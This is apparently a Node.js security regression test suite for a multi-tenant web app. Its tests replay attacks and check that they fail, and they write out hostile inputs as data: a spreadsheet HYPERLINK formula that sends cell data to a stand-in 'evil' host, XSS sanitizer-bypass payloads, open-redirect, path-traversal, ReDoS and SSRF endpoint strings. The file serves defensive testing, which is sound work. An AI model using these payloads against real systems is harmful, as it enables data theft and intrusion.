'use strict';
/**
 * Security regression tests — each test reproduces an attack from the security review
 * and asserts that it no longer works.
 */
process.env.DEFAULT_TENANT = '';
process.env.BASE_DOMAIN = 'sec.local';
process.env.PLATFORM_HOST = 'platform.sec.local';
delete process.env.TRUST_PROXY;

const { test, before, after } = require('node:test');
const assert = require('node:assert/strict');
const request = require('supertest');
const fs = require('fs');
const path = require('path');
const db = require('../src/db');
const tenants = require('../src/lib/tenants');
const totp = require('../src/lib/totp');
const auth = require('../src/lib/auth');
const config = require('../src/config');
const { createApp } = require('../src/app');

const SUFFIX = Date.now().toString(36).slice(-5);
const A = 'sa' + SUFFIX, B = 'sb' + SUFFIX;
const HA = `${A}.sec.local`, HB = `${B}.sec.local`;
const PW = 'Admin@12345!';
let app;

function client(host) {
  const agent = request.agent(app);
  return {
    agent,
    get: url => agent.get(url).set('Host', host),
    async token(url) {
      const r = await agent.get(url).set('Host', host);
      const m = r.text.match(/name="_csrf" value="([^"]+)"/);
      assert.ok(m, 'csrf token on ' + url + ' (' + r.status + ')');
      return m[1];
    },
    async form(url, data, tokenUrl = url) {
      const _csrf = await this.token(tokenUrl);
      return agent.post(url).set('Host', host).type('form').send({ _csrf, ...data });
    },
  };
}
const inA = fn => db.withSchema('tenant_' + A, fn);

before(async () => {
  await tenants.applyPlatformSchema();
  await tenants.createTenant({ slug: A, name: 'Sec A', domains: [HA], adminPassword: PW });
  await tenants.createTenant({ slug: B, name: 'Sec B', domains: [HB], adminPassword: PW });
  for (const s of [A, B]) await db.withSchema('tenant_' + s, () => db.query("UPDATE admin_users SET must_change_password = 0"));
  app = require('http').createServer(createApp());
  await new Promise(r => app.listen(0, '127.0.0.1', r));
});

after(async () => {
  await new Promise(r => app.close(r));
  for (const s of [A, B]) {
    await db.query(`DROP SCHEMA IF EXISTS tenant_${s} CASCADE`);
    await db.query('DELETE FROM platform.tenants WHERE slug = $1', [s]);
    fs.rmSync(path.join(config.uploadDir, s), { recursive: true, force: true });
  }
  await db.pool.end();
});

test('open redirect via backslash / protocol-relative paths is blocked', async () => {
  for (const next of ['/\\evil.com', '//evil.com', '/%5Cevil.com'.replace('%5C', '\\'), 'https://evil.com']) {
    const r = await request(app).get('/lang/en?next=' + encodeURIComponent(next)).set('Host', HA);
    assert.equal(r.headers.location, '/', `next=${next} → ${r.headers.location}`);
  }
});

test('pending 2FA from tenant A cannot be completed on tenant B', async () => {
  const secret = totp.generateSecret();
  for (const s of [A, B]) await db.withSchema('tenant_' + s, () => db.query("UPDATE admin_users SET twofa_enabled = 1, twofa_secret = $1 WHERE username = 'admin'", [secret]));
  const c = client(HA);
  const r1 = await c.form('/admin/login', { username: 'admin', password: PW });
  assert.match(r1.headers.location, /\/admin\/login\/2fa/);
  // replay the same cookie on tenant B and submit B's valid TOTP code
  const r2 = await c.agent.get('/admin/login/2fa').set('Host', HB);
  assert.equal(r2.status, 302, 'B must not offer a 2FA step');
  const page = await c.agent.get('/admin/login').set('Host', HB);
  const tok = page.text.match(/name="_csrf" value="([^"]+)"/)[1];
  await c.agent.post('/admin/login/2fa').set('Host', HB).type('form').send({ _csrf: tok, code: totp.codeAt(secret, totp.currentStep()) });
  const r3 = await c.agent.get('/admin').set('Host', HB);
  assert.equal(r3.status, 302);
  assert.match(r3.headers.location, /\/admin\/login/);
  for (const s of [A, B]) await db.withSchema('tenant_' + s, () => db.query("UPDATE admin_users SET twofa_enabled = 0, twofa_secret = NULL WHERE username = 'admin'"));
});

test('X-Forwarded-For does not bypass rate limits when no proxy is configured', async () => {
  let limited = false;
  for (let i = 0; i < 20 && !limited; i++) {
    const c = client(HA);
    const r = await c.form('/verify', { code: 'NOPE-' + i, cvv: '0000' });
    if (r.status === 429) limited = true;
    // each request also claims a fresh IP
    await request(app).get('/').set('Host', HA).set('X-Forwarded-For', '1.2.3.' + i);
  }
  const spoofed = await request(app).post('/verify').set('Host', HA).set('X-Forwarded-For', '9.9.9.9').type('form').send({ code: 'x', cvv: '1' });
  assert.ok(limited, 'limit reached');
  assert.equal(spoofed.status === 429 || spoofed.status === 403, true, 'spoofed IP still limited (or rejected by CSRF)');
});

test('CSV exports neutralise spreadsheet formulas from public submissions', async () => {
  const c = client(HA);
  const r = await c.form('/apply/grievance', { name: '=HYPERLINK("https://evil/?d="&C2,"x")', phone: '9841000011', subject: '@SUM(1+1)*cmd|x,y', description: 'd', category: 'service' });
  assert.equal(r.status, 302);
  const adm = client(HA);
  await adm.form('/admin/login', { username: 'admin', password: PW });
  const csv = await adm.get('/admin/inbox/grievance/export.csv');
  assert.equal(csv.status, 200);
  assert.ok(!/(^|,)"?=HYPERLINK/m.test(csv.text), 'formula must be prefixed');
  assert.ok(!/(^|,)"?@SUM/m.test(csv.text));
  assert.match(csv.text, /'=HYPERLINK/);
});

test('rich text sanitizer resists tag-splicing and unclosed-tag bypasses', () => {
  const { sanitizeHtml } = require('../src/lib/util');
  for (const p of ['<p>hi</p><<x>img src=x onerror=alert(1)>', '<p>x</p><img src=x onerror=alert(1) ', '<<x>meta http-equiv=refresh content="0;url=https://evil">',
    '<a href=" javascript:alert(1)">a</a>', '<a href="&#106;avascript:alert(1)">b</a>', '<p style="background:url(https://evil)">s</p>', '<svg onload=alert(1)>']) {
    const out = sanitizeHtml(p);
    assert.ok(!/<(img|meta|svg)[^>]*(onerror|onload|http-equiv)|javascript:|style=/i.test(out), `${p} → ${out}`);
  }
});

test('isEmail / stripTags are not vulnerable to ReDoS', () => {
  const { isEmail, stripTags } = require('../src/lib/util');
  const t = Date.now();
  isEmail('a@' + '.'.repeat(500_000) + '@');
  stripTags('<'.repeat(150_000));
  assert.ok(Date.now() - t < 2000, 'took ' + (Date.now() - t) + ' ms');
});

test('push subscriptions only accept real push services and cannot be taken over', async () => {
  const push = require('../src/lib/push');
  const keys = { p256dh: 'BNcRdreALRFXTkOOUHK1EtK2wtaz5Ry4YfYCA_0QTpQtUbVlUls0VJXg7A8u-Ts1XbjhazAkj7I99e8QcYP7DkM', auth: 'tBHItJI5svbpez7KI4CCXg' };
  await inA(async () => {
    const m1 = await db.one("INSERT INTO members (name, phone, approval_status, is_active) VALUES ('P1', '9841000021', 'approved', 1) RETURNING id");
    const m2 = await db.one("INSERT INTO members (name, phone, approval_status, is_active) VALUES ('P2', '9841000022', 'approved', 1) RETURNING id");
    for (const bad of ['https://10.0.0.5:8443/x', 'https://127.0.0.1/x', 'https://evil.example/fcm.googleapis.com', 'http://fcm.googleapis.com/x']) {
      await assert.rejects(() => push.subscribe(m1.id, { endpoint: bad, keys }), /bad subscription/, bad);
    }
    const ep = 'https://fcm.googleapis.com/fcm/send/abc' + SUFFIX;
    await push.subscribe(m1.id, { endpoint: ep, keys });
    await assert.rejects(() => push.subscribe(m2.id, { endpoint: ep, keys }), /another member/);
    assert.equal(await db.value('SELECT member_id FROM member_push_subscriptions WHERE endpoint = $1', [ep]), m1.id);
  });
});

test('private uploads are not public; staff can open them; members cannot', async () => {
  const rel = '_private/grievance/probe.txt';
  const dir = path.join(config.uploadDir, A, '_private/grievance');
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'probe.txt'), 'secret');
  assert.equal((await request(app).get('/uploads/' + rel).set('Host', HA)).status, 404);
  assert.equal((await request(app).get('/uploads/%5Fprivate/grievance/probe.txt').set('Host', HA)).status, 404);
  const anon = await request(app).get('/admin/files/' + rel).set('Host', HA);
  assert.equal(anon.status, 302);
  const adm = client(HA);
  await adm.form('/admin/login', { username: 'admin', password: PW });
  const ok = await adm.get('/admin/files/' + rel);
  assert.equal(ok.status, 200);
  assert.equal((await adm.get('/admin/files/_private/../../../package.json')).status, 404);
});

test('changing a password signs out other sessions; temp passwords force a change', async () => {
  const s1 = client(HA), s2 = client(HA);
  await s1.form('/admin/login', { username: 'admin', password: PW });
  await s2.form('/admin/login', { username: 'admin', password: PW });
  assert.equal((await s2.get('/admin')).status, 200);
  const NEW = 'Changed@12345!x';
  const r = await s1.form('/admin/password', { current: PW, password: NEW, confirm: NEW });
  assert.equal(r.status, 302);
  assert.equal((await s1.get('/admin')).status, 200, 'current session stays');
  assert.equal((await s2.get('/admin')).status, 302, 'other session signed out');
  await inA(async () => db.query("UPDATE admin_users SET password = $1, must_change_password = 1 WHERE username = 'admin'", [await auth.hashPassword(PW)]));
  const s3 = client(HA);
  await s3.form('/admin/login', { username: 'admin', password: PW });
  const blocked = await s3.get('/admin/r/news');
  assert.equal(blocked.status, 302);
  assert.match(blocked.headers.location, /\/admin\/password$/);
  await inA(() => db.query("UPDATE admin_users SET must_change_password = 0 WHERE username = 'admin'"));
});

test('prototype keys and bad dates do not crash routes', async () => {
  assert.equal((await request(app).get('/apply/constructor').set('Host', HA)).status, 404);
  assert.equal((await request(app).get('/apply/__proto__').set('Host', HA)).status, 404);
  const adm = client(HA);
  await adm.form('/admin/login', { username: 'admin', password: PW });
  assert.equal((await adm.get('/admin/r/constructor')).status, 404);
  assert.equal((await adm.get('/admin/inbox/grievance?from=xx&to=yy')).status, 200);
});

test('tracker never shows a submission without a matching phone', async () => {
  const row = await inA(() => db.one("INSERT INTO member_feedback (tracking_id, name, phone, subject, message, status) VALUES ('FB-TEST-NOPHONE', 'Secret Name', '', 's', 'm', 'pending') RETURNING *"));
  const r = await request(app).get('/track?id=' + row.tracking_id + '&phone=').set('Host', HA);
  assert.doesNotMatch(r.text, /Secret Name/);
});

test('ballots are secret: vote rows store no member id', async () => {
  await inA(async () => {
    await db.query("INSERT INTO members (name, phone, sadasyata_number, password_hash, approval_status, is_active) VALUES ('V', '9841888888', 'V-9', $1, 'approved', 1)", [await auth.hashPassword('Voter@1234')]);
    const cy = await db.one("INSERT INTO election_cycles (title_np, is_published, date_from, date_to, voting_enabled, vote_start_at, vote_end_at) VALUES ('E', 1, CURRENT_DATE - 1, CURRENT_DATE + 1, 1, now() - interval '1 hour', now() + interval '1 hour') RETURNING id");
    const pos = await db.one("INSERT INTO election_positions (cycle_id, title_np, seats, max_votes_per_voter, is_active) VALUES ($1, 'P', 1, 1, 1) RETURNING id", [cy.id]);
    await db.query("INSERT INTO election_candidates (cycle_id, position_id, name, is_active) VALUES ($1, $2, 'C', 1)", [cy.id, pos.id]);
  });
  const { cid, pid, cand } = await inA(async () => {
    const cy = await db.one('SELECT max(id) AS id FROM election_cycles');
    const p = await db.one('SELECT id FROM election_positions WHERE cycle_id = $1', [cy.id]);
    const c = await db.one('SELECT id FROM election_candidates WHERE position_id = $1', [p.id]);
    return { cid: cy.id, pid: p.id, cand: c.id };
  });
  const c = client(HA);
  await c.form('/member/login', { identifier: '9841888888', password: 'Voter@1234' });
  const v = await c.form('/member/elections/' + cid, { ['pos_' + pid]: String(cand) });
  assert.equal(v.status, 302);
  const rows = await inA(() => db.many('SELECT member_id FROM election_votes WHERE cycle_id = $1', [cid]));
  assert.equal(rows.length, 1);
  assert.equal(rows[0].member_id, null);
});

test('SMS/email to one recipient is capped per day', async () => {
  const notify = require('../src/lib/notify');
  await inA(async () => {
    for (let i = 0; i < 3; i++) await db.query("INSERT INTO notification_log (event_type, channel, recipient, subject, message, status, created_at) VALUES ('submitted', 'sms', '9841777777', '', 'x', 'sent', now())");
    assert.equal(await notify.overLimit('sms', 'submitted', '9841777777'), 'recipient limit reached');
    assert.equal(await notify.overLimit('sms', 'submitted', '9841777778'), null);
  });
});

test('editor role cannot change elections or message templates', async () => {
  await inA(async () => db.query("INSERT INTO admin_users (username, password, full_name, role, is_active, status) VALUES ('ed2', $1, 'Ed', 'editor', 1, 'active')", [await auth.hashPassword('Editor@12345')]));
  const c = client(HA);
  await c.form('/admin/login', { username: 'ed2', password: 'Editor@12345' });
  for (const r of ['election_candidates', 'election_cycles', 'notification_templates', 'information_room_items']) {
    assert.equal((await c.get('/admin/r/' + r)).status, 403, r);
  }
  assert.equal((await c.get('/admin/r/news')).status, 200);
});

test('anonymous page views without forms do not create sessions', async () => {
  const before = await db.value('SELECT count(*) FROM platform.user_sessions');
  for (let i = 0; i < 5; i++) await request(app).get('/about').set('Host', HA);
  const afterN = await db.value('SELECT count(*) FROM platform.user_sessions');
  assert.ok(afterN - before <= 0, `sessions created: ${afterN - before}`);
});
